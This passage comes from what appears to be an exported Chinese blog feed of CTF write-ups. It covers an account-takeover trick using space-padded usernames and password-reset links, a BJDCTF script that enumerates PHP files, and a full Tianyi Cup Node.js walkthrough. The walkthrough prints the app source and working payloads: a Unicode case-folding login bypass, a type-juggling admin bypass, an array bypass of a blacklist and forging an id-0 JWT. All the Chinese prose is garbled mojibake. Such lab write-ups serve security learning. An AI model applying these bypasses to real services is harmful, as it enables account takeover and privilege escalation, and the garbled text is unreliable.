<li><strong>åˆ©ç”¨é¦–å°¾æ·»åŠ ç©ºæ ¼ç»•è¿‡é™åˆ¶æ¥æ³¨å†Œä¸€ä¸ªä¸å—å®³è€…ç”¨æˆ·åç›¸åŒçš„è´¦å·</strong></li>
<li><strong>æ‰¾å›å¯†ç é“¾æ¥å‘é€åˆ°è‡ªå·±çš„é‚®ç®±</strong></li>
<li><strong>ä¿®æ”¹è‡ªå·±è´¦å·çš„ç”¨æˆ·åï¼ˆä¸å—å®³è€…ä¸åŒï¼‰</strong></li>
<li><strong>ç‚¹å‡»é‡ç½®å¯†ç é“¾æ¥ï¼Œè®¾ç½®æ–°å¯†ç </strong></li>
</ul>
<h2 id="BJDCTF-2nd-elementmaster">BJDCTF 2nd elementmaster</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>æƒ³è±¡åŠ›</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p>è¿™é“é¢˜çœŸçš„æœ‰ç‚¹è„‘æ´å¤§å¼€äº†ã€‚ã€‚ã€‚ã€‚</p>
<p>æ‰“å¼€é¢˜ç›®æœ‰ä¸¤ä¸ªhideæ ‡ç­¾ï¼Œidå¾ˆå¯ç–‘ï¼Œæ„Ÿè§‰æ˜¯Hexç¼–ç ï¼Œç”¨å·¥å…·è½¬æ¢æˆASCIIæ‹¼æ¥åæ˜¯<code>Po.php</code>ã€‚</p>
<p>è¿™é‡Œå°±è¦çŸ¥é“Poæ˜¯ä¸€ä¸ªåŒ–å­¦å…ƒç´ ï¼Œå†ç»“åˆé¢˜ç›®å’Œå›¾ç‰‡ï¼ŒæŠŠæ‰€æœ‰çš„åŒ–å­¦å…ƒç´ éƒ½ç»™éå†ä¸€éã€‚ç›´æ¥çœ‹åˆ«äººçš„WPï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">periodic_table = (<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;He&#x27;</span>, <span class="string">&#x27;Li&#x27;</span>, <span class="string">&#x27;Be&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;Ne&#x27;</span>, <span class="string">&#x27;Na&#x27;</span>, <span class="string">&#x27;Mg&#x27;</span>, <span class="string">&#x27;Al&#x27;</span>, <span class="string">&#x27;Si&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;Cl&#x27;</span>, <span class="string">&#x27;Ar&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Ca&#x27;</span>, <span class="string">&#x27;Sc&#x27;</span>, <span class="string">&#x27;Ti&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;Cr&#x27;</span>, <span class="string">&#x27;Mn&#x27;</span>, <span class="string">&#x27;Fe&#x27;</span>, <span class="string">&#x27;Co&#x27;</span>, <span class="string">&#x27;Ni&#x27;</span>, <span class="string">&#x27;Cu&#x27;</span>, <span class="string">&#x27;Zn&#x27;</span>, <span class="string">&#x27;Ga&#x27;</span>, <span class="string">&#x27;Ge&#x27;</span>, <span class="string">&#x27;As&#x27;</span>, <span class="string">&#x27;Se&#x27;</span>, <span class="string">&#x27;Br&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Kr&#x27;</span>, <span class="string">&#x27;Rb&#x27;</span>, <span class="string">&#x27;Sr&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Zr&#x27;</span>, <span class="string">&#x27;Nb&#x27;</span>, <span class="string">&#x27;Mo&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>, <span class="string">&#x27;Ru&#x27;</span>, <span class="string">&#x27;Rh&#x27;</span>, <span class="string">&#x27;Pd&#x27;</span>, <span class="string">&#x27;Ag&#x27;</span>, <span class="string">&#x27;Cd&#x27;</span>, <span class="string">&#x27;In&#x27;</span>, <span class="string">&#x27;Sn&#x27;</span>, <span class="string">&#x27;Sb&#x27;</span>, <span class="string">&#x27;Te&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;Xe&#x27;</span>, <span class="string">&#x27;Cs&#x27;</span>, <span class="string">&#x27;Ba&#x27;</span>, <span class="string">&#x27;La&#x27;</span>, <span class="string">&#x27;Ce&#x27;</span>, <span class="string">&#x27;Pr&#x27;</span>, <span class="string">&#x27;Nd&#x27;</span>, <span class="string">&#x27;Pm&#x27;</span>, <span class="string">&#x27;Sm&#x27;</span>, <span class="string">&#x27;Eu&#x27;</span>, <span class="string">&#x27;Gd&#x27;</span>, <span class="string">&#x27;Tb&#x27;</span>, <span class="string">&#x27;Dy&#x27;</span>, <span class="string">&#x27;Ho&#x27;</span>, <span class="string">&#x27;Er&#x27;</span>, <span class="string">&#x27;Tm&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Yb&#x27;</span>, <span class="string">&#x27;Lu&#x27;</span>, <span class="string">&#x27;Hf&#x27;</span>, <span class="string">&#x27;Ta&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;Re&#x27;</span>, <span class="string">&#x27;Os&#x27;</span>, <span class="string">&#x27;Ir&#x27;</span>, <span class="string">&#x27;Pt&#x27;</span>, <span class="string">&#x27;Au&#x27;</span>, <span class="string">&#x27;Hg&#x27;</span>, <span class="string">&#x27;Tl&#x27;</span>, <span class="string">&#x27;Pb&#x27;</span>, <span class="string">&#x27;Bi&#x27;</span>, <span class="string">&#x27;Po&#x27;</span>, <span class="string">&#x27;At&#x27;</span>, <span class="string">&#x27;Rn&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Fr&#x27;</span>, <span class="string">&#x27;Ra&#x27;</span>, <span class="string">&#x27;Ac&#x27;</span>, <span class="string">&#x27;Th&#x27;</span>, <span class="string">&#x27;Pa&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;Np&#x27;</span>, <span class="string">&#x27;Pu&#x27;</span>, <span class="string">&#x27;Am&#x27;</span>, <span class="string">&#x27;Cm&#x27;</span>, <span class="string">&#x27;Bk&#x27;</span>, <span class="string">&#x27;Cf&#x27;</span>, <span class="string">&#x27;Es&#x27;</span>, <span class="string">&#x27;Fm&#x27;</span>, <span class="string">&#x27;Md&#x27;</span>, <span class="string">&#x27;No&#x27;</span>, <span class="string">&#x27;Lr&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;Rf&#x27;</span>, <span class="string">&#x27;Db&#x27;</span>, <span class="string">&#x27;Sg&#x27;</span>, <span class="string">&#x27;Bh&#x27;</span>, <span class="string">&#x27;Hs&#x27;</span>, <span class="string">&#x27;Mt&#x27;</span>, <span class="string">&#x27;Ds&#x27;</span>, <span class="string">&#x27;Rg&#x27;</span>, <span class="string">&#x27;Cn&#x27;</span>, <span class="string">&#x27;Nh&#x27;</span>, <span class="string">&#x27;Fl&#x27;</span>, <span class="string">&#x27;Mc&#x27;</span>, <span class="string">&#x27;Lv&#x27;</span>, <span class="string">&#x27;Ts&#x27;</span>, <span class="string">&#x27;Og&#x27;</span>, <span class="string">&#x27;Uue&#x27;</span>)</span><br><span class="line">url = <span class="string">&quot;http://5fd398b5-f94f-4f8a-b379-797755b20891.node3.buuoj.cn/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> periodic_table:</span><br><span class="line">    req = requests.get(url + element + <span class="string">&quot;.php&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> req.status_code != requests.codes.ok:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    result += req.text</span><br><span class="line">print(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è·‘å‡ºæ¥çš„å­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªæ–‡ä»¶åï¼Œæ‰“å¼€å³æ˜¯flagã€‚</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ç”µä¿¡å¤©ç¿¼æ¯CTFåˆèµ›-APITest</title>
    <url>/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest/</url>
    <content><![CDATA[<h1 id="2020ç”µä¿¡å¤©ç¿¼æ¯CTF-APITest">2020ç”µä¿¡å¤©ç¿¼æ¯CTF APITest</h1>
<blockquote>
<p>å…ˆåæ§½ä¸€ä¸‹ï¼Œèµ›åç«Ÿç„¶æ²¡æœ‰WPï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p>
</blockquote>
<p>å®Œå…¨ä¸ä¼šnodejsï¼Œåšäº†ä¸€ä¸‹åˆå±…ç„¶åšå‡ºæ¥äº†ã€‚ã€‚ã€‚é¢˜ç›®æ‰“å¼€ï¼Œè®¿é—®<code>source</code>APIæ¥å£ï¼Œæ˜¾ç¤ºæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&quot;cors&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> uuidv4 = <span class="built_in">require</span>(<span class="string">&quot;uuid/v4&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> md5 = <span class="built_in">require</span>(<span class="string">&quot;md5&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;express-jwt&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jsonwebtoken = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> server = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>).createServer(app);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; flag, secret, jwtSecret &#125; = <span class="built_in">require</span>(<span class="string">&quot;./flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  port: process.env.PORT || <span class="number">8081</span>,</span><br><span class="line">  adminValue: <span class="number">1000</span>,</span><br><span class="line">  message: <span class="string">&quot;Can you get flag?&quot;</span>,</span><br><span class="line">  secret: secret,</span><br><span class="line">  adminUsername: <span class="string">&quot;kirakira_dokidoki&quot;</span>,</span><br><span class="line">  whitelist: [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;/login&quot;</span>, <span class="string">&quot;/init&quot;</span>, <span class="string">&quot;/source&quot;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> users = &#123;</span><br><span class="line">  <span class="number">0</span>: &#123;</span><br><span class="line">    username: config.adminUsername,</span><br><span class="line">    isAdmin: <span class="literal">true</span>,</span><br><span class="line">    rights: <span class="built_in">Object</span>.keys(config)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line">app.use(</span><br><span class="line">  jwt(&#123; <span class="attr">secret</span>: jwtSecret &#125;).unless(&#123;</span><br><span class="line">    path: config.whitelist</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">error, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error.name === <span class="string">&quot;UnauthorizedError&quot;</span>) &#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;Invalid token or not logged in.&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sign</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> jsonwebtoken.sign(o, jwtSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params">data = &#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">&quot;ok&quot;</span>, <span class="attr">data</span>: data &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">err</span>(<span class="params">msg = <span class="string">&quot;Something went wrong.&quot;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>, <span class="attr">message</span>: msg &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">6</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toLowerCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (u.username.toUpperCase() === config.adminUsername.toUpperCase() &amp;&amp; u.username.toUpperCase() === config.adminUsername.toLowerCase()) || u.isAdmin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">&quot;secret&quot;</span>, <span class="string">&quot;port&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(blacklist.includes(arr)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">hint</span>:  <span class="string">&quot;You can get source code from /source&quot;</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/source&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.sendFile( __dirname + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;app.js&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> u = &#123;</span><br><span class="line">    username: req.body.username,</span><br><span class="line">    id: uuidv4(),</span><br><span class="line">    value: <span class="built_in">Math</span>.random() &lt; <span class="number">0.0000001</span> ? <span class="number">100000000</span> : <span class="number">100</span>,</span><br><span class="line">    isAdmin: <span class="literal">false</span>,</span><br><span class="line">    rights: [</span><br><span class="line">      <span class="string">&quot;message&quot;</span>,</span><br><span class="line">      <span class="string">&quot;adminUsername&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (isValidUser(u)) &#123;</span><br><span class="line">    users[u.id] = u;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: u.id &#125;) &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;Invalid creds&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/init&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; secret &#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> target = md5(config.secret.toString());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> adminId = md5(secret)</span><br><span class="line">    .split(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    .map(<span class="function">(<span class="params">c, i</span>) =&gt;</span> c.charCodeAt(<span class="number">0</span>) ^ target.charCodeAt(i))</span><br><span class="line">    .reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b);</span><br><span class="line"></span><br><span class="line">  res.json(ok(&#123; <span class="attr">token</span>: sign(&#123; <span class="attr">id</span>: adminId &#125;) &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get server info</span></span><br><span class="line">app.get(<span class="string">&quot;/serverInfo&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> user = users[req.user.id] || &#123; <span class="attr">rights</span>: [] &#125;;</span><br><span class="line">  <span class="keyword">let</span> info = user.rights.map(<span class="function"><span class="params">i</span> =&gt;</span> (&#123; <span class="attr">name</span>: i, <span class="attr">value</span>: config[i] &#125;));</span><br><span class="line">  res.json(ok(&#123; <span class="attr">info</span>: info &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/becomeAdmin&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123;value&#125; = req.body;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> maxValue = [value, config.adminValue].sort()[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(value &gt;= maxValue &amp;&amp; user.value &gt;= value) &#123;</span><br><span class="line">    user.isAdmin = <span class="literal">true</span>;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;You need pay more!&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only admin can update user</span></span><br><span class="line">app.post(<span class="string">&quot;/updateUser&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> uid = req.user.id;</span><br><span class="line">  <span class="keyword">let</span> user = users[uid];</span><br><span class="line">  <span class="keyword">if</span> (!user || !isAdmin(user)) &#123;</span><br><span class="line">    res.json(err(<span class="string">&quot;You&#x27;re not an admin!&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> rights = req.body.rights || [];</span><br><span class="line">  <span class="keyword">if</span> (rights.length &gt; <span class="number">0</span> &amp;&amp; checkRights(rights)) &#123;</span><br><span class="line">    users[uid].rights = user.rights.concat(rights).filter(<span class="function">(<span class="params">value, index, self</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> self.indexOf(value) === index;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(ok(&#123; <span class="attr">user</span>: users[uid] &#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// only uid===0 can get the flag</span></span><br><span class="line">app.get(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.user.id == <span class="number">0</span>) &#123;</span><br><span class="line">    res.send(ok(&#123; <span class="attr">flag</span>: flag &#125;));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.send(err(<span class="string">&quot;Unauthorized&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.listen(config.port, <span class="function">() =&gt;</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;config.port&#125;</span>!`</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="åŸºæœ¬æ€è·¯">åŸºæœ¬æ€è·¯</h2>
<ul>
<li>åˆ©ç”¨javascriptå¤§å°å†™ç‰¹æ€§ä½¿ç”¨ç®¡ç†å‘˜çš„ç”¨æˆ·åç™»å½•</li>
<li>ä½¿ç”¨å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡<code>isAdmin</code>åˆ¤æ–­</li>
<li>ç»™ç”¨æˆ·æ·»åŠ æŸ¥çœ‹secretçš„æƒé™å¹¶æŸ¥çœ‹secretçš„å€¼</li>
<li>é€šè¿‡èµ‹å€¼secretå°†adminIdè®¾ç½®ä¸º0</li>
<li>è·å–Flag</li>
</ul>
<h2 id="ç¬¬ä¸€æ­¥">ç¬¬ä¸€æ­¥</h2>
<p><code>login</code>APIç”¨<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">javascriptå¤§å°å†™ç‰¹æ€§ç»•è¿‡</a>ï¼Œpayload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;â„ªÄ±rakira_dokidoki&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾tokençš„å€¼</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVkMWNlYmU1LTFiZWItNDA4Yi05YzE2LTViOGQ0NmM4ODIzMCIsImlhdCI6MTU5NjE4MTUyOH0.uyZInKJWeJ7mr290HKV5Z41Pf6_aCjPvvDEKkvanbtk&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬äºŒæ­¥">ç¬¬äºŒæ­¥</h2>
<p><code>becomeAdmin</code>APIä½¿ç”¨å­—ç¬¦ä¸²ç»•è¿‡</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;value&quot;</span>: <span class="string">&quot;11&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬ä¸‰æ­¥">ç¬¬ä¸‰æ­¥</h2>
<p>ä½¿ç”¨æ•°ç»„ç»•è¿‡<code>updateUser</code>API</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;rights&quot;</span>:[[<span class="string">&quot;secret&quot;</span>]]&#125;</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;user&quot;</span>:&#123;<span class="attr">&quot;username&quot;</span>:<span class="string">&quot;â„ªÄ±rakira_dokidoki&quot;</span>,<span class="attr">&quot;id&quot;</span>:<span class="string">&quot;ed1cebe5-1beb-408b-9c16-5b8d46c88230&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="number">100</span>,<span class="attr">&quot;isAdmin&quot;</span>:<span class="literal">true</span>,<span class="attr">&quot;rights&quot;</span>:[<span class="string">&quot;message&quot;</span>,<span class="string">&quot;adminUsername&quot;</span>,[<span class="string">&quot;secret&quot;</span>]]&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬å››æ­¥">ç¬¬å››æ­¥</h2>
<p>ç›´æ¥è®¿é—®<code>serverInfo</code>è·å–<code>secret</code>çš„å€¼ï¼Œå›æ˜¾</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;info&quot;</span>:[&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;message&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;Can you get flag?&quot;</span>&#125;,&#123;<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;adminUsername&quot;</span>,<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;kirakira_dokidoki&quot;</span>&#125;,&#123;<span class="attr">&quot;name&quot;</span>:[<span class="string">&quot;secret&quot;</span>],<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;1145141919810&quot;</span>&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬äº”æ­¥">ç¬¬äº”æ­¥</h2>
<p>è®¿é—®<code>init</code>APIï¼Œpayload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;secret&quot;</span>:<span class="string">&quot;1145141919810&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>å›æ˜¾</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;status&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTk2MTg3MDk4fQ.Fdfrcfvnxjdh54WcTbu79nqKFv1dcucBCAoTJenw52I&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬å…­æ­¥">ç¬¬å…­æ­¥</h2>
<p>æŠŠåˆšåˆšè·å¾—åˆ°çš„id=0çš„tokenæ›¿æ¢ä¹‹å‰çš„tokenå¾—åˆ°flagã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/HWHF%7B2J0HY0Q4%60ZX9$F3%25RQ.png" alt=""></p>
<p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/7177">https://xz.aliyun.com/t/7177</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>æ˜Ÿç›Ÿ6æœˆAWDå¤ç›˜â€”â€”web+pwn</title>
    <url>/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn/</url>
    <content><![CDATA[<h1 id="æ˜Ÿç›Ÿ6æœˆAWDå¤ç›˜â€”â€”web-pwn">æ˜Ÿç›Ÿ6æœˆAWDå¤ç›˜â€”â€”web+pwn</h1>
<blockquote>
<p>PWNç”±é˜Ÿå†…gamouså¸ˆå‚…å’Œremilaå¸ˆå‚…æ’°å†™</p>
</blockquote>
<h2 id="PWN">PWN</h2>
<h3 id="PWN1">PWN1</h3>
<p>idaæ²¡æ³•åç¼–è¯‘ï¼Œé€ æˆäº†å¾ˆå¤§çš„å›°æ‰°ï¼Œå¯ä»¥çœ‹åˆ°æœ‰é€‰é¡¹1æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œè€Œä¸”ç›´æ¥è¾“å‡ºçš„è¯ä¹Ÿæœ‰æ®‹ç•™æŒ‡é’ˆï¼Œä½†åªæœ‰ä¸€æ¬¡æœºä¼šï¼Œæé«˜äº†åˆ©ç”¨éš¾åº¦ï¼Œä¿®å¤çš„è¯ç›´æ¥æŠŠreadçš„å€¼æ”¹äº†<br>
gameæ˜¯patchä¸¤æ¬¡gameçš„elfä¹‹åè®¾ç½®æƒé™æ‰§è¡Œï¼Œç›´æ¥æŠŠpatchçš„èµ‹å€¼nopæ‰äº†<br>
ç„¶åæ˜¯ä¸€ä¸ªnotepadï¼Œå †ä¸Šå¸¸è§çš„ç©æ³•</p>
<p>æ²¡èƒ½åŠæ—¶å†™å‡ºexpä¸”èŠ±äº†å¤ªå¤šæ—¶é—´åœ¨è¿™é¢˜ä¸Š<br>
